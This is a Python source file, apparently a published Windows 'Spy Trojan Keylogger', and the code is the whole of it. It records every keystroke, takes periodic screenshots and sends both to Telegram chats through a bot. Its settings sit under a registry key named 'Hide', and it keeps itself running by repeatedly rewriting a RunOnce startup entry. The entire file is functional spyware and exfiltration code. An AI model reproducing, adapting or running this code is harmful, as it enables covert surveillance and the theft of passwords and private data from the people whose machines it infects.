# ░██████╗██████╗░██╗░░░██╗  ████████╗██████╗░░█████╗░░░░░░██╗░█████╗░███╗░░██╗
# ██╔════╝██╔══██╗╚██╗░██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗░░░░░██║██╔══██╗████╗░██║
# ╚█████╗░██████╔╝░╚████╔╝░  ░░░██║░░░██████╔╝██║░░██║░░░░░██║███████║██╔██╗██║
# ░╚═══██╗██╔═══╝░░░╚██╔╝░░  ░░░██║░░░██╔══██╗██║░░██║██╗░░██║██╔══██║██║╚████║
# ██████╔╝██║░░░░░░░░██║░░░  ░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚███║
# ╚═════╝░╚═╝░░░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝

# ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
# ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
# █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗                 v6.0
# ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║           by SebastianEPH
# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝   https://github.com/SebastianEPH|

import winreg
from pynput.keyboard import Listener  # Escucha eventos del teclado
import os  # Lib para copiar archivos
#import socket  # Verifica internet
import threading  # procesos multihilos
from datetime import datetime  # Devuelve fecha y hora actual
import datetime  # Devuelve fecha y hora actual
import random  # Genera numeros
import telepot  # Telegram API
import string  # Lib genera textos
import time  # Contar segundos
from shutil import rmtree  # Remove foldes with files
from PIL import ImageGrab  # Take Screenshot


class WinRegistry:
    def __init__(self, path):
        self.afterPath = path
        self.HKEY = None
        self.__listHKEY = [
            'HKEY_CLASSES_ROOT',
            'HKEY_CURRENT_USER',
            'HKEY_LOCAL_MACHINE',
            'HKEY_DYN_DATA',
            'HKEY_PERFORMANCE_DATA',
            'HKEY_USERS',
            'HKEY_CURRENT_CONFIG']

        for hkey in self.__listHKEY:
            index = self.afterPath.find(hkey)  # getting boot index
            if index != -1:  # Only if it was successful
                if str(hkey) == 'HKEY_CLASSES_ROOT':
                    self.HKEY = winreg.HKEY_CLASSES_ROOT
                elif str(hkey) == 'HKEY_CURRENT_USER':
                    self.HKEY = winreg.HKEY_CURRENT_USER
                elif str(hkey) == 'HKEY_LOCAL_MACHINE':
                    self.HKEY = winreg.HKEY_LOCAL_MACHINE
                elif str(hkey) == 'HKEY_DYN_DATA':
                    self.HKEY = winreg.HKEY_DYN_DATA
                elif str(hkey) == 'HKEY_PERFORMANCE_DATA':
                    self.HKEY = winreg.HKEY_PERFORMANCE_DATA
                elif str(hkey) == 'HKEY_USERS':
                    self.HKEY = winreg.HKEY_CLASSES_ROOT
                elif str(hkey) == 'HKEY_CURRENT_CONFIG':
                    self.HKEY = winreg.HKEY_CURRENT_CONFIG
                else:
                    print('Error path invalido')
                index = index + len(hkey) + 1  # Index cut
                end = len(self.afterPath)  # End cut
                self.afterPath = self.afterPath[index:end]  # cut path

    def __format_after_path(self):
        afterPath = self.afterPath
        if afterPath != "":
            return afterPath + "\\"
        else:
            return afterPath

    def __create_value(self, type, nameValue, value):
        self.create_key('')
        opened_key = winreg.OpenKey(self.HKEY, self.afterPath, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(opened_key, nameValue, 0, type, value)
        opened_key.Close()

    def create_key(self, keyName):
        winreg.CreateKeyEx(self.HKEY, self.__format_after_path() + keyName, 0, winreg.KEY_ALL_ACCESS)

    def delete_key(self, keyName):
        try:
            winreg.DeleteKeyEx(self.HKEY, self.__format_after_path() + keyName, winreg.KEY_ALL_ACCESS, 0)
        except:
            pass

    def read_value(self, nameValue):
        # Open key
        opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,
                                    winreg.KEY_ALL_ACCESS)  # Error if key is emply
        # Create value
        f = winreg.QueryValueEx(opened_key, nameValue)
        print(f[0])
        return f[0]

    def set_value_String(self, nameValue, value):
        self.__create_value(winreg.REG_SZ, nameValue, value)

    def set_value_Binary(self, nameValue, value):
        self.__create_value(winreg.REG_BINARY, nameValue, value)

    def set_value_DWORD(self, nameValue, value):
        self.__create_value(winreg.REG_DWORD, nameValue, value)

    def set_value_QWORD(self, nameValue, value):
        self.__create_value(winreg.REG_QWORD, nameValue, value)

    def set_value_MultiString(self, nameValue, value):
        self.__create_value(winreg.REG_MULTI_SZ, nameValue, value)

    def set_value_ExpandableString(self, nameValue, value):
        self.__create_value(winreg.REG_EXPAND_SZ, nameValue, value)

    def delete_value(self, nameValue):
        try:
            # Open key
            opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,
                                        winreg.KEY_ALL_ACCESS)  # Error if key is emply
            # Create value
            winreg.DeleteValue(opened_key, nameValue)
        except:
            pass


class Util:
    def create_folder(self, path):
        try:  # Intenta crear la dirección
            os.makedirs(path)
            print("[CreateFolders] Success create folder: " + path)
        except:
            print("[CreateFolders] Folder really exist: " + path)


    def delete_folder(self, folder):
        try:
            rmtree(folder)
            print("[CreateFolders] Success remove folder and files: " + folder)
        except:
            print("[CreateFolders] Mistake while was remove folder and files" + folder)

    def current_time(self):
        T = datetime.datetime.now()
        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
            "%I") + " " + T.strftime("%M") + " " + T.strftime("%p")

    def random_char(self, number=4):  # Genera letras aleatorias [Longitud según el argumento]
        return ''.join(random.choice(string.ascii_letters) for x in range(number))

    def delete_cache(self, path):
        try:
            os.removedirs(path)
        except:
            pass


class Keylogger:
    def __init__(self):
        self.__buffer = ""
        self.__regeditPath_Telegram = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot"
        self.__regeditPath_keylogger = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger"
        self.__limit = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('limit')))
        self.__active = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('active')))

    def _send(self, reg_text):
        self.__active = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('active')))
        if self.__active == 1:
            __token = str(WinRegistry(self.__regeditPath_Telegram).read_value('token'))
            __id = WinRegistry(self.__regeditPath_Telegram).read_value('id')
            bot = telepot.Bot(__token)
            for id in __id:
                try:
                    bot.sendMessage(id, reg_text)
                    print("[SEND TelegramBot] Send keylogger to: [ID] = " + str(id))
                except:
                    print("[SEND TelegramBot] there was a mistake when sending the [ID] = " + str(id))
        else:
            pass

    def listen_key(self):
        def _key_min(numberKey):  # Caracteres Comunes // Optimizados
            switcher = {
                # Vocales Minisculas
                "'a'": "a",
                "'e'": "e",
                "'i'": "i",
                "'o'": "o",
                "'u'": "u",
                # Letras  Minusculas
                "'b'": "b",
                "'c'": "c",
                "'d'": "d",
                "'f'": "f",
                "'g'": "g",
                "'h'": "h",
                "'j'": "j",
                "'J'": "J",
                "'k'": "k",
                "'l'": "l",
                "'m'": "m",
                "'n'": "n",
                "'ñ'": "ñ",
                "'p'": "p",
                "'q'": "q",
                "'r'": "r",
                "'s'": "s",
                "'t'": "t",
                "'v'": "v",
                "'w'": "w",
                "'x'": "x",
                "'y'": "y",
                "'z'": "z",
                # Caracteres
                "','": ",",  # ,
                "'.'": ".",  # .
                "'_'": "_",  # _
                "'-'": "-",  # -
                "':'": ":",  #
                # Vocales Mayúsculas
                "'A'": "A",
                "'E'": "E",
                "'I'": "I",
                "'O'": "O",
                "'U'": "U",
                # Letras Mayúsculas
                "'B'": "B",
                "'C'": "C",
                "'D'": "D",
                "'F'": "F",
                "'G'": "G",
                "'H'": "H",
                "'K'": "K",
                "'L'": "L",
                "'M'": "M",
                "'N'": "N",
                "'Ñ'": "Ñ",
                "'P'": "P",
                "'Q'": "Q",
                "'R'": "R",
                "'S'": "S",
                "'T'": "T",
                "'V'": "V",
                "'W'": "W",
                "'X'": "X",
                "'Y'": "Y",
                "'Z'": "Z",
                # Números Standard
                "'1'": "1",
                "'2'": "2",
                "'3'": "3",
                "'4'": "4",
                "'5'": "5",
                "'6'": "6",
                "'7'": "7",
                "'8'": "8",
                "'9'": "9",
                "'0'": "0",
                # Caracteres Especiales
                "'@'": "@",  # @
                "'#'": "#",  # #
                "'*'": "*",  # *
                "'('": "(",  # (
                "')'": ")",  # )
                '"\'"': "'",  # '
                "'\"'": '"',  # "
                "'?'": "?",  # ?
                "'='": "=",  # =
                "'+'": "+",  # +
                "'!'": "!",  # !
                "'}'": "}",  # }
                "'{'": "{",  # {}
                "'´'": "´",  # ´
                "'|'": "|",  # |
                "'°'": "°",  # °
                "'^'": "¬",  # ^
                "';'": ";",  #
                "'$'": "$",  # $
                "'%'": "%",  # %
                "'&'": "&",  # &
                "'>'": ">",  #
                "'<'": "<",  #
                "'/'": "/",  # /
                "'¿'": "¿",  # ¿
                "'¡'": "¡",  # ¡
                "'~'": "~"  #
            }
            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible

        def _key_max(numberKey):  # Botones, comunes // Optimizados
            switcher = {
                "Key.space": " ",  # Espacio
                "Key.backspace": "⋪",  # Borrar
                "Key.enter": "\n",  # Salto de linea
                "Key.tab": "    ",  # Tabulación
                "Key.delete": "❌",  # Suprimir
                # Números
                "<96>": "0",  # 0
                "<97>": "1",  # 1
                "<98>": "2",  # 2
                "<99>": "3",  # 3
                "<100>": "4",  # 4
                "<101>": "5",  # 5
                "<102>": "6",  # 6
                "<103>": "7",  # 7
                "<104>": "8",  # 8
                "<105>": "9",  # 9
                "<181>": "♪",  # Open Music ♪

                # Números Númeral
                "None<96>": "0",  # 0
                "None<97>": "1",  # 1
                "None<98>": "2",  # 2
                "None<99>": "3",  # 3
                "None<100>": "4",  # 4
                "None<101>": "5",  # 5
                "None<102>": "6",  # 6
                "None<103>": "7",  # 7
                "None<104>": "8",  # 8
                "None<105>": "9",  # 9
                # Teclas raras 2
                "['^']": "^",
                "['`']": "`",  #
                "['¨']": "¨",  #
                "['´']": "´",  #
                "<110>": ".",  #
                "None<110>": ".",  #
                "Key.alt_l": " ◀Alt ",  #
                "Key.alt_r": " Alt▶ ",
                "Key.shift_r": " Shift▶ ",
                "Key.shift": " ◀Shift ",
                "Key.ctrl_r": " Ctrl▶ ",  #
                "Key.ctrl_l": " ◀Ctrl ",  #
                "Key.right": "▶",  #
                "Key.left": "◀",  #
                "Key.up": "🔼",  #
                "Key.down": "🔽",  #
                # "'\x16'"  : " [Pegó] ",
                # "'\x18'"  : " [Cortar] ",
                # "'\x03'"  : " [Copiar] ",
                "Key.caps_lock": " 🔒⌨ ",
                "Key.num_lock": " 🔒🔢 ",
                # "Key.media_previous"    : "⏮",
                # "Key.media_next"        : "⏭",
                # "Key.media_play_pause"  : "⏹",
                # "Key.media_volume_mute" : "🔇",
                # "Key.media_volume_up" : "🔊",
                # "Key.media_volume_down" : "🔉",
                "Key.cmd": " ⊞ "
            }
            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible

        # instance Obj Config
        print("[KeyLogger] - Start OK")

        def press(key):
            try:
                if (len(str(key))) <= 3:
                    temp = _key_min(str(key))  # Optimitation process and memory
                else:
                    temp = _key_max(str(key))  # Optimitation process and memory
                self.__buffer = self.__buffer + temp  # save keylogger in variable
                print("    " + str(key) + " <= [key press]=> " + temp)
                print(self.__buffer)

                if len(self.__buffer) >= self.__limit:
                    self.__limit = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('limit')))
                    print("[KEYLOGGER] Reached or exceeded the limit  => " + str(len(self.__buffer)))
                    self._send(self.__buffer)
                    self.__buffer = ""
                else:
                    print("[KEYLOGGER] Current text length  => " + str(len(self.__buffer)))
            except:
                print("[KEYLOGGER] there was a mistake getting key ")

        with Listener(on_press=press) as listener:
            listener.join()


class Screenshot:
    def __init__(self):
        self.__regeditPath_Telegram = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot"
        self.__regeditPath_screenshot = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot"
        self.__path = str(WinRegistry(self.__regeditPath_screenshot).read_value('path'))
        self.__interval = WinRegistry(self.__regeditPath_screenshot).read_value('interval_seconds')
        self.__active = int(str(WinRegistry(self.__regeditPath_screenshot).read_value('active')))
        self.__username = str(WinRegistry(r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide").read_value('username'))

    def _delete(self, name):
        try:
            os.remove(self.__path + name)
            print("[ScreenShot] Delete Sucess")
        except:
            print("[ScreenShot] There was a mistake while erasing file")

    def send(self):
        # Crear carpeta
        while True:
            if self.__active == 1:
                try:
                    __token = str(WinRegistry(self.__regeditPath_Telegram).read_value('token'))
                    __id = WinRegistry(self.__regeditPath_Telegram).read_value('id')
                    name = self.__username + " " + Util().current_time() + " " + Util().random_char(5) + ".png"
                    print("[Screenshot] File name: " + name)

                    ImageGrab.grab().save(self.__path + "\\" + name)
                    print("[ScreenShot] Take and save screenshot")
                    bot = telepot.Bot(__token)
                    for id in __id:
                        try:
                            bot.sendChatAction(id, 'upload_photo')
                            bot.sendDocument(id, open(self.__path + "\\" + name, 'rb'))
                            print("[SEND ScreenShot] Send keylogger to: [ID] " + str(id))
                        except:
                            print("[SEND ScreenShot] there was a mistake when sending the [ID] " + str(id))
                    self._delete(name)
                except:
                    pass
            else:
                pass
            self.__interval = WinRegistry(self.__regeditPath_screenshot).read_value('interval_seconds')
            self.__active = int(str(WinRegistry(self.__regeditPath_screenshot).read_value('active')))
            time.sleep(self.__interval)


class StartUp:
    def __init__(self):
        self.__regStartUpOnce = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
        self.__regStartUp = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        self.__regSoftware = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide"
        self.__path = str(WinRegistry(self.__regSoftware).read_value('path'))
        self.__interval = 65  # Repeat interval  in seconds

    def set_startup(self):
        while True:
            WinRegistry(self.__regStartUpOnce).set_value_ExpandableString('software', self.__path)
            time.sleep(self.__interval)
            pass


if __name__ == '__main__':
    folders = [
        # str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('path')),
        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').read_value('path'))
    ]
    for f in folders:
        Util().delete_folder(f)  # Remove foldes and files // Cache
        Util().create_folder(f)  # Create folders for cache

    time.sleep(1)
    # Eliminar todas las carpetas
    threading.Thread(target=Keylogger().listen_key).start()
    threading.Thread(target=Screenshot().send).start()
    threading.Thread(target=StartUp().set_startup).start()

""" added after 
leer value, si no lo encuntra
entonces
retornar un falso
o un true
"""
